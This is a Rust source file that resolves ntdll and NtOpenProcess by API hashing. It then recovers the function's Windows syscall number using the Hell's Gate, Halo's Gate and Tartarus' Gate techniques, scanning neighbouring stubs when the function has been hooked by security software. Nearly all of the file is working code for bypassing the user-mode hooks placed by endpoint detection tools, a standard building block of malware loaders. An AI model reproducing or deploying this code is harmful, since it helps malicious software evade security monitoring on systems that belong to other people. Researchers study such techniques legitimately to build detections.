use pemadness::dbj2_hash;

use crate::pemadness::{get_export_by_hash, get_loaded_module_by_hash};

mod pemadness;

const NTDLL_HASH: u32 = 0x1edab0ed;

const UP: isize = -32;
const DOWN: usize = 32;

pub struct VxTableEntry {
    p_address: *mut u8,
    w_system_call: u16,
}

fn main() {
    env_logger::init();

    let ntdll_base_address = unsafe {
        get_loaded_module_by_hash(NTDLL_HASH).expect("Failed to get loaded module by name")
    };

    log::debug!("[+] NTDLL Address: {:p}", ntdll_base_address);

    let mut vx_table_entry = VxTableEntry {
        p_address: unsafe {
            get_export_by_hash(ntdll_base_address, dbj2_hash("NtOpenProcess".as_bytes()))
                .expect("Failed to get export by hash")
        },
        w_system_call: 0,
    };

    log::debug!("Function Address: {:p}", vx_table_entry.p_address);

    unsafe { mordor(&mut vx_table_entry).expect("Failed to call mordor") };

    log::debug!("Syscall Number: {:#x}", vx_table_entry.w_system_call);
}

pub unsafe fn mordor(vx_table_entry: &mut VxTableEntry) -> Option<bool> {
    // Hell's gate
    //
    //

    //vx_table_entry.w_system_call = find_syscall_number(vx_table_entry.p_address as _);

    // check if the assembly instruction are:
    // mov r10, rcx
    // mov rcx, <syscall>
    if vx_table_entry.p_address.read() == 0x4c
        && vx_table_entry.p_address.add(1).read() == 0x8b
        && vx_table_entry.p_address.add(2).read() == 0xd1
        && vx_table_entry.p_address.add(3).read() == 0xb8
        && vx_table_entry.p_address.add(6).read() == 0x00
        && vx_table_entry.p_address.add(7).read() == 0x00
    {
        let high = vx_table_entry.p_address.add(5).read();
        let low = vx_table_entry.p_address.add(4).read();
        vx_table_entry.w_system_call = ((high.overflowing_shl(8).0) | low) as u16;
        return Some(true);
    }

    //
    // Halo's Gate Patch
    //

    if vx_table_entry.p_address.read() == 0xe9 {
        for idx in 1..500 {
            //
            // if hooked check the neighborhood to find clean syscall (downwards)
            //

            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
                return Some(true);
            }

            //
            // if hooked check the neighborhood to find clean syscall (upwards)
            //

            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
                && vx_table_entry
                    .p_address
                    .offset(1 + idx as isize * UP)
                    .read()
                    == 0x8b
                && vx_table_entry
                    .p_address
                    .offset(2 + idx as isize * UP)
                    .read()
                    == 0xd1
                && vx_table_entry
                    .p_address
                    .offset(3 + idx as isize * UP)
                    .read()
                    == 0xb8
                && vx_table_entry
                    .p_address
                    .offset(6 + idx as isize * UP)
                    .read()
                    == 0x00
                && vx_table_entry
                    .p_address
                    .offset(7 + idx as isize * UP)
                    .read()
                    == 0x00
            {
                let high: u8 = vx_table_entry
                    .p_address
                    .offset(5 + idx as isize * UP)
                    .read();
                let low: u8 = vx_table_entry
                    .p_address
                    .offset(4 + idx as isize * UP)
                    .read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
                return Some(true);
            }
        }
    }

    //
    // Tartarus' Gate Patch
    //

    if vx_table_entry.p_address.add(3).read() == 0xe9 {
        for idx in 1..500 {
            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
                return Some(true);
            }

            //
            // if hooked check the neighborhood to find clean syscall (upwards)
            //

            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
                && vx_table_entry
                    .p_address
                    .offset(1 + idx as isize * UP)
                    .read()
                    == 0x8b
                && vx_table_entry
                    .p_address
                    .offset(2 + idx as isize * UP)
                    .read()
                    == 0xd1
                && vx_table_entry
                    .p_address
                    .offset(3 + idx as isize * UP)
                    .read()
                    == 0xb8
                && vx_table_entry
                    .p_address
                    .offset(6 + idx as isize * UP)
                    .read()
                    == 0x00
                && vx_table_entry
                    .p_address
                    .offset(7 + idx as isize * UP)
                    .read()
                    == 0x00
            {
                let high: u8 = vx_table_entry
                    .p_address
                    .offset(5 + idx as isize * UP)
                    .read();
                let low: u8 = vx_table_entry
                    .p_address
                    .offset(4 + idx as isize * UP)
                    .read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
                return Some(true);
            }
        }
    }

    return Some(false);
}

#[allow(dead_code)]
/// Extracts the system call number from the specfied function pointer
fn find_syscall_number(function_ptr: *mut u8) -> u16 {
    let needle: [u8; 4] = [0x4c, 0x8b, 0xd1, 0xb8];

    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(function_ptr as *const u8, 6) };

    if let Some(index) = func_slice.windows(needle.len()).position(|x| *x == needle) {
        let offset = index + needle.len();
        let offset_slice = &func_slice[offset..offset + 2];

        let syscall_number = u16::from_le_bytes(offset_slice.try_into().unwrap());

        log::debug!("{:#x}", syscall_number);
        return syscall_number;
    }

    return 0;
}
